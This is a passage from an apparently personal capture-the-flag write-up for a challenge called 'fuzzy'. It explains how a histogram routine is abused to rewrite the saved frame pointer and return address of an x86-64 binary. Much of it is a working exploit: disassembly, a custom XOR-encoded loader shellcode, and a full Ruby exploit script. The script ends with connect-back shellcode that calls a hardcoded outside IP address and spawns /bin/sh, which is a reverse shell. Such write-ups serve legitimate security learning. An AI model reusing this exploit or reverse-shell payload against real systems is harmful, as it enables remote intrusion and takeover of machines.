It's been a couple months since I did this, and details for the next few hours of work are fuzzy. I spent *a lot* of time - probably in the realm of 8 hours or more - trying to figure out what to increment before I noticed this code at the end of charHistrogram():

```

<span class="Identifier">charHistrogram</span>():<span class="Constant">006034BE</span> <span class="Identifier">locret_6034BE</span>:                          <span class="Comment">; CODE XREF: charHistogram+357j</span>
<span class="Statement">.data</span>:<span class="Constant">006034BE</span>                 <span class="Identifier">leave</span>
<span class="Statement">.data</span>:<span class="Constant">006034BF</span>                 <span class="Identifier">retn</span>
```

I was in the habit of ignoring 'leave', and didn't really think about it. D'oh! The 'leave' instruction pops rbp off the stack (which we control!), then 'ret', of course, returns to the address on the stack (which we also control). Aha!

For an attack, we can modify both the frame pointer - changing how we address local variables - and the return address. Let's see how!

## The attack

As I mentioned, I wanted to change the return address. Specifically, I wanted to change it from 0x40160E (the normal return address) to 0x4015AA. The reason I want it to be 0x4015AA is because at that address, this code is found:

```

<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">AA</span>                 <span class="Identifier">mov</span>     <span class="Identifier">r9d</span>, <span class="Constant">0 </span>         <span class="Comment">; offset</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">B0</span>                 <span class="Identifier">mov</span>     <span class="Identifier">r8d</span>, 0<span class="Identifier">FFFFFFFFh</span> <span class="Comment">; fd</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">B6</span>                 <span class="Identifier">mov</span>     <span class="Identifier">ecx</span>, <span class="Constant">22</span><span class="Identifier">h</span>        <span class="Comment">; flags</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">BB</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, <span class="Constant">7</span>          <span class="Comment">; prot</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">C0</span>                 <span class="Identifier">mov</span>     <span class="Identifier">esi</span>, <span class="Constant">514</span><span class="Identifier">h</span>       <span class="Comment">; len</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">C5</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edi</span>, <span class="Constant">0 </span>         <span class="Comment">; addr</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">CA</span>                 <span class="Identifier">call</span>    <span class="Identifier">_mmap</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">CF</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">addr</span>], <span class="Identifier">rax</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">D3</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rcx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">src</span>]
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">D7</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">addr</span>]
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">DB</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, <span class="Constant">514</span><span class="Identifier">h</span>       <span class="Comment">; n</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">E0</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rsi</span>, <span class="Identifier">rcx</span>        <span class="Comment">; src</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">E3</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; dest</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">E6</span>                 <span class="Identifier">call</span>    <span class="Identifier">_memcpy</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">EB</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">addr</span>]
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">EF</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">F2</span>                 <span class="Identifier">call</span>    <span class="Identifier">decryptFunction</span>
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">F7</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">addr</span>]
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">FB</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">var_20</span>]
<span class="Statement">.text</span>:<span class="Constant">004015</span><span class="Identifier">FF</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rsi</span>, <span class="Identifier">rax</span>
<span class="Statement">.text</span>:<span class="Constant">00401602</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edi</span>, <span class="Identifier">offset</span> <span class="Identifier">global_f</span>
<span class="Statement">.text</span>:<span class="Constant">00401607</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Constant">0</span>
<span class="Statement">.text</span>:<span class="Constant">0040160</span><span class="Identifier">C</span>                 <span class="Identifier">call</span>    <span class="Identifier">rdx</span>
```

Which allocates memory, copies code into it (*relative to rbp*, the frame pointer, which I eventually realized that we control!), decrypts it, and runs it. If we can change the return address to that line, and change rbp just enough that \[rbp+src\] points to memory we control, we're home free!

Now, to change 0x40160E (the normal return address) to 0x4015AA (the address I want), I had to increment the last byte 0xCA (0xAA - 0xE0) times, and increment the second-last byte once (0x16 - 0x15). I wrote a function called edit\_memory() that would essentially do the math for you and increment the proper bytes:

```

<span class="lnr"> 67 </span><span class="rubyDefine">def</span> <span class="Identifier">edit_memory</span>(from, to, location)
<span class="lnr"> 68 </span>  <span class="Comment"># Handle each of the 8 bytes, though in practice I think we only needed</span>
<span class="lnr"> 69 </span>  <span class="Comment"># the first two</span>
<span class="lnr"> 70 </span>  <span class="Constant">0</span>.upto(<span class="Constant">7</span>) <span class="Statement">do</span> |<span class="Identifier">i</span>|
<span class="lnr"> 71 </span>    <span class="Comment"># Get the before and after values for the current byte</span>
<span class="lnr"> 72 </span>    from_i = (from >> (<span class="Constant">8</span> * i)) & <span class="Constant">0xFF</span>
<span class="lnr"> 73 </span>    to_i   = (to   >> (<span class="Constant">8</span> * i)) & <span class="Constant">0xFF</span>
<span class="lnr"> 74 </span>
<span class="lnr"> 75 </span>    <span class="Comment"># As long as the bytes are different, add the current 'increment' character</span>
<span class="lnr"> 76 </span>    <span class="Statement">while</span>(from_i != to_i) <span class="Statement">do</span>
<span class="lnr"> 77 </span>      <span class="Comment"># If we already have the location from the shellcode or something, don't</span>
<span class="lnr"> 78 </span>      <span class="Comment"># repeat it</span>
<span class="lnr"> 79 </span>      <span class="Statement">if</span>(!<span class="Identifier">@@used_chars</span>[location+i].nil? && <span class="Identifier">@@used_chars</span>[location+i] > <span class="Constant">0</span>)
<span class="lnr"> 80 </span>        <span class="Identifier">$stderr</span>.puts(<span class="Special">"</span><span class="Constant">Saved a character!</span><span class="Special">"</span>)
<span class="lnr"> 81 </span>        <span class="Identifier">@@used_chars</span>[location+i] -= <span class="Constant">1</span>
<span class="lnr"> 82 </span>      <span class="Statement">else</span>
<span class="lnr"> 83 </span>        my_print((location+i).chr)
<span class="lnr"> 84 </span>      <span class="Statement">end</span>
<span class="lnr"> 85 </span>
<span class="lnr"> 86 </span>      <span class="Comment"># Increment as a byte</span>
<span class="lnr"> 87 </span>      from_i = (from_i + <span class="Constant">1</span>) & <span class="Constant">0xFF</span>
<span class="lnr"> 88 </span>    <span class="Statement">end</span>
<span class="lnr"> 89 </span>  <span class="Statement">end</span>
<span class="lnr"> 90 </span><span class="rubyDefine">end</span>
```

One unfortunate issue that I ran into is that the frame pointer - rbp - is slightly different on my test system and the eventual production system. I ended up writing a small brute forcer that would attempt to run the shellcode "\\xeb\\xfe" over and over, with slightly different rbp addresses, until it finally stopped responding, telling me that the infinite loop was successful. That was ugly, but it worked well in the end!

## Shellcode

That all sounds pretty straight forward, but there was a catch: I decided to point \[rbp+src\] to the beginning of the character array that's fed into the histogram. That may sound good, since I control that memory in full, but the catch is that any character > 0x88 has a chance of modifying an important stack address, which means all shellcode I could find would simply corrupt the stack and crash. D'oh! It also had to be encoded, since the code is decoded (XORed with 0xFF) before being run, but that's easy.

I spent a lot of time writing code that would basically read a file off the remote filesystem. After a couple hours of carefully crafting shellcode, I finally got it working and realized that the filename wasn't the same filename used in the previous two levels. I had no idea which file to read! As a result, I had to write full on exec bind-shell shellcode.

After another couple hours trying to get exec to work without crashing, I gave up that approach, and decided to write a loader instead. A loader can be shorter and simpler, but can run any arbitrary code.

Three custom shellcode later, considering I had never, up to this point, written 64-bit assembly code, I had both working shellcode and a fairly good understanding of 64-bit shellcoding! :)

Here's what I ended up coming up with:

```

<span class="Comment"># Encode the custom-written loader code that basically reads from the</span>
<span class="Comment"># socket into some allocated memory, then runs it.</span>
<span class="Comment">#</span>
<span class="Comment"># Trivia: This is my first 64-bit shellcode! :)</span>
<span class="Comment">#</span>
<span class="Comment"># This had to be carefully constructed because it would influence the</span>
<span class="Comment"># eventual histogram, which would modify the stack and therefore break</span>
<span class="Comment"># everything.</span>
my_print(encode_shellcode(

  <span class="Special">"</span><span class="Special">\xb8\x09\x00\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov eax, 0x00000006 (mmap)</span>
  <span class="Special">"</span><span class="Special">\xbf\x00\x00\x00\x41</span><span class="Special">"</span>     + <span class="Comment"># mov edi, 0x41000000 (addr)</span>
  <span class="Special">"</span><span class="Special">\xbe\x00\x10\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov esi, 0x1000 (size)</span>
  <span class="Special">"</span><span class="Special">\xba\x07\x00\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov rdx, 7 (prot)</span>
  <span class="Special">"</span><span class="Special">\x41\xba\x32\x00\x00\x00</span><span class="Special">"</span> + <span class="Comment"># mov r10, 0x32 (flags)</span>
  <span class="Special">"</span><span class="Special">\x41\xb8\x00\x00\x00\x00</span><span class="Special">"</span> + <span class="Comment"># mov r8, 0</span>
  <span class="Special">"</span><span class="Special">\x41\xb9\x00\x00\x00\x00</span><span class="Special">"</span> + <span class="Comment"># mov r9, 0</span>
  <span class="Special">"</span><span class="Special">\x0f\x05</span><span class="Special">"</span>                 + <span class="Comment"># syscall - mmap</span>

  <span class="Special">"</span><span class="Special">\xbf\x98\xf8\xd0\xb0</span><span class="Special">"</span>     + <span class="Comment"># mov edi, ptr to socket ^ 0xb0b0b0b0</span>
  <span class="Special">"</span><span class="Special">\x81\xf7\xb0\xb0\xb0\xb0</span><span class="Special">"</span> + <span class="Comment"># xor edi, 0xb0b0b0b0</span>
  <span class="Special">"</span><span class="Special">\x48\x8b\x3f</span><span class="Special">"</span>             + <span class="Comment"># mov edi, [edi]</span>

  <span class="Special">"</span><span class="Special">\xb8\x00\x00\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov rax, 0</span>
  <span class="Special">"</span><span class="Special">\xbe\x00\x00\x00\x41</span><span class="Special">"</span>     + <span class="Comment"># mov esi, 0x41000000</span>
  <span class="Special">"</span><span class="Special">\xba\x00\x20\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov edx, 0x2000</span>
  <span class="Special">"</span><span class="Special">\x0f\x05</span><span class="Special">"</span>                 + <span class="Comment"># syscall - read</span>
  <span class="Special">"</span><span class="Special">\x56\xc3</span><span class="Special">"</span>                 + <span class="Comment"># push esi / ret</span>
  <span class="Special">"</span><span class="Special">\xc3</span><span class="Special">"</span>                     + <span class="Comment"># ret</span>

  <span class="Special">"</span><span class="Special">\xcd\x03</span><span class="Special">"</span> <span class="Comment"># int 3</span>
))
```

Basically, this calls mmap() to allocate a bunch of memory, reads the actual socket descriptor from a global varibale, reads data from the socket into the memory, then jumps to the start of it. Now I can use a bind-shell I found online without worrying about input restrictions!

## The exploit

I don't think I chose the best possible way to attack this vulnerability. As I mentioned before, it required a small amount of bruteforcing to get offsets on the production server, which isn't the cleanest. Here's the exploit, in full, with comments. I've already explained the interesting bits:

```

<span class="lnr">  1 </span><span class="Comment"># The base address of the array that overwrites code</span>
<span class="lnr">  2 </span><span class="Comment"># (Note: this can change based on the length that we sent! The rest doesn't appear to)</span>
<span class="lnr">  3 </span><span class="Type">BASE_VULN_ARRAY</span> = 0x7fffffffdf80-0x90
<span class="lnr">  4 </span>
<span class="lnr">  5 </span><span class="Comment"># The real target and my local target have different desired FP values</span>
<span class="lnr">  6 </span><span class="Type">IS_REAL_TARGET</span> = <span class="Constant">1</span>
<span class="lnr">  7 </span>
<span class="lnr">  8 </span><span class="Comment"># We want to edit the return address</span>
<span class="lnr">  9 </span><span class="Type">RETURN_ADDR</span>         = <span class="Constant">0x7fffffffdf88</span>  <span class="Comment"># Where the value we want to edit is</span>
<span class="lnr"> 10 </span><span class="Type">RETURN_OFFSET</span>       = <span class="Type">RETURN_ADDR</span> - <span class="Type">BASE_VULN_ARRAY</span>
<span class="lnr"> 11 </span><span class="Type">REAL_RETURN_ADDR</span>    = <span class="Constant">0x40160E</span>
<span class="lnr"> 12 </span><span class="Type">DESIRED_RETURN_ADDR</span> = <span class="Constant">0x4015AA</span>
<span class="lnr"> 13 </span>
<span class="lnr"> 14 </span><span class="Comment"># And also edit the frame pointer</span>
<span class="lnr"> 15 </span><span class="Type">FP_ADDR</span>         = <span class="Constant">0x7fffffffdf80</span>
<span class="lnr"> 16 </span><span class="Type">FP_OFFSET</span>       = <span class="Type">FP_ADDR</span> - <span class="Type">BASE_VULN_ARRAY</span>
<span class="lnr"> 17 </span><span class="Type">REAL_FP</span>         = <span class="Constant">0x00007fffffffdfb0</span>
<span class="lnr"> 18 </span><span class="Type">DESIRED_FP</span>      = <span class="Constant">0x00007fffffffdfe8</span> + (<span class="Constant">7</span> * <span class="Constant">8</span> * <span class="Type">IS_REAL_TARGET</span>)
<span class="lnr"> 19 </span>
<span class="lnr"> 20 </span><span class="Comment"># This global tracks which characters we use in our shellcode, to avoid</span>
<span class="lnr"> 21 </span><span class="Comment"># influence the histogram values for the important offsets</span>
<span class="lnr"> 22 </span><span class="Identifier">@@used_chars</span> = []
<span class="lnr"> 23 </span>
<span class="lnr"> 24 </span><span class="Comment"># Keep track of how many bytes were printed, so we can print padding after</span>
<span class="lnr"> 25 </span><span class="Comment"># (and avoid changing the size of the stack)</span>
<span class="lnr"> 26 </span><span class="Comment">#</span>
<span class="lnr"> 27 </span><span class="Comment"># I added this because I noticed addresses on the stack shifting relative</span>
<span class="lnr"> 28 </span><span class="Comment"># to each other, a bit, though that may have been sleep-deprived daftness</span>
<span class="lnr"> 29 </span><span class="Identifier">@@n</span> = <span class="Constant">0</span>
<span class="lnr"> 30 </span><span class="rubyDefine">def</span> <span class="Identifier">my_print</span>(str)
<span class="lnr"> 31 </span>  print(str)
<span class="lnr"> 32 </span>  <span class="Identifier">@@n</span> += str.length
<span class="lnr"> 33 </span><span class="rubyDefine">end</span>
<span class="lnr"> 34 </span>
<span class="lnr"> 35 </span><span class="Comment"># Code is 'encrypted' with a simple xor operation</span>
<span class="lnr"> 36 </span><span class="rubyDefine">def</span> <span class="Identifier">encode_shellcode</span>(code)
<span class="lnr"> 37 </span>  buf = <span class="Special">""</span>
<span class="lnr"> 38 </span>
<span class="lnr"> 39 </span>  <span class="Constant">0</span>.upto(code.length-1) <span class="Statement">do</span> |<span class="Identifier">i</span>|
<span class="lnr"> 40 </span>    c = code[i].ord ^ <span class="Constant">0xFF</span>;
<span class="lnr"> 41 </span>
<span class="lnr"> 42 </span>    <span class="Comment"># If encoded shellcode contains a newline, it won't work, so catch it early</span>
<span class="lnr"> 43 </span>    <span class="Statement">if</span>(c == <span class="Constant">0x0a</span>)
<span class="lnr"> 44 </span>      <span class="Identifier">$stderr</span>.puts(<span class="Special">"</span><span class="Constant">Shellcode has a newline! :(</span><span class="Special">"</span>)
<span class="lnr"> 45 </span>      <span class="Statement">exit</span>
<span class="lnr"> 46 </span>    <span class="Statement">end</span>
<span class="lnr"> 47 </span>
<span class="lnr"> 48 </span>    <span class="Comment"># Increment the histogram for this character</span>
<span class="lnr"> 49 </span>    <span class="Identifier">@@used_chars</span>[c] = <span class="Identifier">@@used_chars</span>[c].nil? ? <span class="Constant">1</span> : <span class="Identifier">@@used_chars</span>[c] + <span class="Constant">1</span>
<span class="lnr"> 50 </span>
<span class="lnr"> 51 </span>    <span class="Comment"># Append it to the buffer</span>
<span class="lnr"> 52 </span>    buf += c.chr
<span class="lnr"> 53 </span>  <span class="Statement">end</span>
<span class="lnr"> 54 </span>
<span class="lnr"> 55 </span>  <span class="Statement">return</span> buf
<span class="lnr"> 56 </span><span class="rubyDefine">end</span>
<span class="lnr"> 57 </span>
<span class="lnr"> 58 </span><span class="Comment"># This will edit any memory address up to 32 bytes away on the stack. I</span>
<span class="lnr"> 59 </span><span class="Comment"># wrote it because I got sick of doing this manually.</span>
<span class="lnr"> 60 </span><span class="Comment">#</span>
<span class="lnr"> 61 </span><span class="Comment"># Basically, it looks at two variables - the 'from' is the original, known</span>
<span class="lnr"> 62 </span><span class="Comment"># value, and 'to' is value we want it to be. It modifies each of the</span>
<span class="lnr"> 63 </span><span class="Comment"># variables one byte at a time, by incrementing the byte.</span>
<span class="lnr"> 64 </span><span class="Comment">#</span>
<span class="lnr"> 65 </span><span class="Comment"># Each byte increment is one character in the output, so the more different</span>
<span class="lnr"> 66 </span><span class="Comment"># the values are, the bigger the output gets (eventually getting too big)</span>
<span class="lnr"> 67 </span><span class="rubyDefine">def</span> <span class="Identifier">edit_memory</span>(from, to, location)
<span class="lnr"> 68 </span>  <span class="Comment"># Handle each of the 8 bytes, though in practice I think we only needed</span>
<span class="lnr"> 69 </span>  <span class="Comment"># the first two</span>
<span class="lnr"> 70 </span>  <span class="Constant">0</span>.upto(<span class="Constant">7</span>) <span class="Statement">do</span> |<span class="Identifier">i</span>|
<span class="lnr"> 71 </span>    <span class="Comment"># Get the before and after values for the current byte</span>
<span class="lnr"> 72 </span>    from_i = (from >> (<span class="Constant">8</span> * i)) & <span class="Constant">0xFF</span>
<span class="lnr"> 73 </span>    to_i   = (to   >> (<span class="Constant">8</span> * i)) & <span class="Constant">0xFF</span>
<span class="lnr"> 74 </span>
<span class="lnr"> 75 </span>    <span class="Comment"># As long as the bytes are different, add the current 'increment' character</span>
<span class="lnr"> 76 </span>    <span class="Statement">while</span>(from_i != to_i) <span class="Statement">do</span>
<span class="lnr"> 77 </span>      <span class="Comment"># If we already have the location from the shellcode or something, don't</span>
<span class="lnr"> 78 </span>      <span class="Comment"># repeat it</span>
<span class="lnr"> 79 </span>      <span class="Statement">if</span>(!<span class="Identifier">@@used_chars</span>[location+i].nil? && <span class="Identifier">@@used_chars</span>[location+i] > <span class="Constant">0</span>)
<span class="lnr"> 80 </span>        <span class="Identifier">$stderr</span>.puts(<span class="Special">"</span><span class="Constant">Saved a character!</span><span class="Special">"</span>)
<span class="lnr"> 81 </span>        <span class="Identifier">@@used_chars</span>[location+i] -= <span class="Constant">1</span>
<span class="lnr"> 82 </span>      <span class="Statement">else</span>
<span class="lnr"> 83 </span>        my_print((location+i).chr)
<span class="lnr"> 84 </span>      <span class="Statement">end</span>
<span class="lnr"> 85 </span>
<span class="lnr"> 86 </span>      <span class="Comment"># Increment as a byte</span>
<span class="lnr"> 87 </span>      from_i = (from_i + <span class="Constant">1</span>) & <span class="Constant">0xFF</span>
<span class="lnr"> 88 </span>    <span class="Statement">end</span>
<span class="lnr"> 89 </span>  <span class="Statement">end</span>
<span class="lnr"> 90 </span><span class="rubyDefine">end</span>
<span class="lnr"> 91 </span>
<span class="lnr"> 92 </span><span class="Comment"># Choose 'histogram'</span>
<span class="lnr"> 93 </span>puts(<span class="Special">"</span><span class="Constant">1</span><span class="Special">"</span>)
<span class="lnr"> 94 </span>
<span class="lnr"> 95 </span><span class="Comment"># The first part gets eaten, I'm not sure why</span>
<span class="lnr"> 96 </span>my_print(encode_shellcode(<span class="Special">"</span><span class="Special">\x90</span><span class="Special">"</span> * <span class="Constant">20</span>))
<span class="lnr"> 97 </span>
<span class="lnr"> 98 </span><span class="Comment"># Encode the custom-written loader code that basically reads from the</span>
<span class="lnr"> 99 </span><span class="Comment"># socket into some allocated memory, then runs it.</span>
<span class="lnr">100 </span><span class="Comment">#</span>
<span class="lnr">101 </span><span class="Comment"># Trivia: This is my first 64-bit shellcode! :)</span>
<span class="lnr">102 </span><span class="Comment">#</span>
<span class="lnr">103 </span><span class="Comment"># This had to be carefully constructed because it would influence the</span>
<span class="lnr">104 </span><span class="Comment"># eventual histogram, which would modify the stack and therefore break</span>
<span class="lnr">105 </span><span class="Comment"># everything.</span>
<span class="lnr">106 </span>my_print(encode_shellcode(
<span class="lnr">107 </span>
<span class="lnr">108 </span>  <span class="Special">"</span><span class="Special">\xb8\x09\x00\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov eax, 0x00000006 (mmap)</span>
<span class="lnr">109 </span>  <span class="Special">"</span><span class="Special">\xbf\x00\x00\x00\x41</span><span class="Special">"</span>     + <span class="Comment"># mov edi, 0x41000000 (addr)</span>
<span class="lnr">110 </span>  <span class="Special">"</span><span class="Special">\xbe\x00\x10\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov esi, 0x1000 (size)</span>
<span class="lnr">111 </span>  <span class="Special">"</span><span class="Special">\xba\x07\x00\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov rdx, 7 (prot)</span>
<span class="lnr">112 </span>  <span class="Special">"</span><span class="Special">\x41\xba\x32\x00\x00\x00</span><span class="Special">"</span> + <span class="Comment"># mov r10, 0x32 (flags)</span>
<span class="lnr">113 </span>  <span class="Special">"</span><span class="Special">\x41\xb8\x00\x00\x00\x00</span><span class="Special">"</span> + <span class="Comment"># mov r8, 0</span>
<span class="lnr">114 </span>  <span class="Special">"</span><span class="Special">\x41\xb9\x00\x00\x00\x00</span><span class="Special">"</span> + <span class="Comment"># mov r9, 0</span>
<span class="lnr">115 </span>  <span class="Special">"</span><span class="Special">\x0f\x05</span><span class="Special">"</span>                 + <span class="Comment"># syscall - mmap</span>
<span class="lnr">116 </span>
<span class="lnr">117 </span>  <span class="Special">"</span><span class="Special">\xbf\x98\xf8\xd0\xb0</span><span class="Special">"</span>     + <span class="Comment"># mov edi, ptr to socket ^ 0xb0b0b0b0</span>
<span class="lnr">118 </span>  <span class="Special">"</span><span class="Special">\x81\xf7\xb0\xb0\xb0\xb0</span><span class="Special">"</span> + <span class="Comment"># xor edi, 0xb0b0b0b0</span>
<span class="lnr">119 </span>  <span class="Special">"</span><span class="Special">\x48\x8b\x3f</span><span class="Special">"</span>             + <span class="Comment"># mov edi, [edi]</span>
<span class="lnr">120 </span>
<span class="lnr">121 </span>  <span class="Special">"</span><span class="Special">\xb8\x00\x00\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov rax, 0</span>
<span class="lnr">122 </span>  <span class="Special">"</span><span class="Special">\xbe\x00\x00\x00\x41</span><span class="Special">"</span>     + <span class="Comment"># mov esi, 0x41000000</span>
<span class="lnr">123 </span>  <span class="Special">"</span><span class="Special">\xba\x00\x20\x00\x00</span><span class="Special">"</span>     + <span class="Comment"># mov edx, 0x2000</span>
<span class="lnr">124 </span>  <span class="Special">"</span><span class="Special">\x0f\x05</span><span class="Special">"</span>                 + <span class="Comment"># syscall - read</span>
<span class="lnr">125 </span>  <span class="Special">"</span><span class="Special">\x56\xc3</span><span class="Special">"</span>                 + <span class="Comment"># push esi / ret</span>
<span class="lnr">126 </span>  <span class="Special">"</span><span class="Special">\xc3</span><span class="Special">"</span>                     + <span class="Comment"># ret</span>
<span class="lnr">127 </span>
<span class="lnr">128 </span>  <span class="Special">"</span><span class="Special">\xcd\x03</span><span class="Special">"</span> <span class="Comment"># int 3</span>
<span class="lnr">129 </span>))
<span class="lnr">130 </span>
<span class="lnr">131 </span><span class="Comment"># The 'decryption' function requires some NOPs (I think 6) followed by a return</span>
<span class="lnr">132 </span><span class="Comment"># to identify the end of an encrypted function</span>
<span class="lnr">133 </span>my_print(encode_shellcode((<span class="Special">"</span><span class="Special">\x90</span><span class="Special">"</span> * <span class="Constant">10</span>) + <span class="Special">"</span><span class="Special">\xc3</span><span class="Special">"</span>))
<span class="lnr">134 </span>
<span class="lnr">135 </span><span class="Comment">## Increment the return address</span>
<span class="lnr">136 </span>edit_memory(<span class="Type">REAL_RETURN_ADDR</span>, <span class="Type">DESIRED_RETURN_ADDR</span>, <span class="Type">RETURN_OFFSET</span>)
<span class="lnr">137 </span>edit_memory(<span class="Type">REAL_FP</span>, <span class="Type">DESIRED_FP</span>, <span class="Type">FP_OFFSET</span>)
<span class="lnr">138 </span>
<span class="lnr">139 </span><span class="Comment"># Pad up to exactly 0x300 bytes</span>
<span class="lnr">140 </span><span class="Statement">while</span>(<span class="Identifier">@@n</span> < <span class="Constant">0x300</span>)
<span class="lnr">141 </span>  my_print(encode_shellcode(<span class="Special">"</span><span class="Special">\x90</span><span class="Special">"</span>))
<span class="lnr">142 </span>  <span class="Identifier">@@n</span> += <span class="Constant">1</span>
<span class="lnr">143 </span><span class="Statement">end</span>
<span class="lnr">144 </span>
<span class="lnr">145 </span><span class="Comment"># Add the final newline, which triggers the overwrites and stuff</span>
<span class="lnr">146 </span>puts()
<span class="lnr">147 </span>
<span class="lnr">148 </span><span class="Comment"># This is standard shellcode I found online and modified a tiny bit</span>
<span class="lnr">149 </span><span class="Comment">#</span>
<span class="lnr">150 </span><span class="Comment"># It's what's read by the 'loader'.</span>
<span class="lnr">151 </span><span class="Type">SCPORT</span> = <span class="Special">"</span><span class="Special">\x41\x41</span><span class="Special">"</span> <span class="Comment"># 16705 */</span>
<span class="lnr">152 </span><span class="Type">SCIPADDR</span> = <span class="Special">"</span><span class="Special">\xce\xdc\xc4\x3b</span><span class="Special">"</span> <span class="Comment"># 206.220.196.59 */</span>
<span class="lnr">153 </span>puts(<span class="Special">""</span> +
<span class="lnr">154 </span>  <span class="Special">"</span><span class="Special">\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a</span><span class="Special">"</span> +
<span class="lnr">155 </span>  <span class="Special">"</span><span class="Special">\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0</span><span class="Special">"</span> +
<span class="lnr">156 </span>  <span class="Special">"</span><span class="Special">\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24</span><span class="Special">"</span> +
<span class="lnr">157 </span>  <span class="Special">"</span><span class="Special">\x02</span><span class="Special">"</span>+<span class="Type">SCPORT</span>+<span class="Special">"</span><span class="Special">\xc7\x44\x24\x04</span><span class="Special">"</span>+<span class="Type">SCIPADDR</span>+<span class="Special">"</span><span class="Special">\x48\x89\xe6\x6a\x10</span><span class="Special">"</span> +
<span class="lnr">158 </span>  <span class="Special">"</span><span class="Special">\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48</span><span class="Special">"</span> +
<span class="lnr">159 </span>  <span class="Special">"</span><span class="Special">\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a</span><span class="Special">"</span> +
<span class="lnr">160 </span>  <span class="Special">"</span><span class="Special">\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54</span><span class="Special">"</span> +
<span class="lnr">161 </span>  <span class="Special">"</span><span class="Special">\x5f\x6a\x3b\x58\x0f\x05\0\0\0\0</span><span class="Special">"</span>)
<span class="lnr">162 </span>
```

## Conclusion

So, that's my months-late writeup of fuzzy! I think I captured most of the details accurately. One thing I haven't mentioned is that I ended up finishing it at about 6:30am, a solid 12 hours of working after I started! It certainly shouldn't have been that difficult, but I took some long wrong turns. :)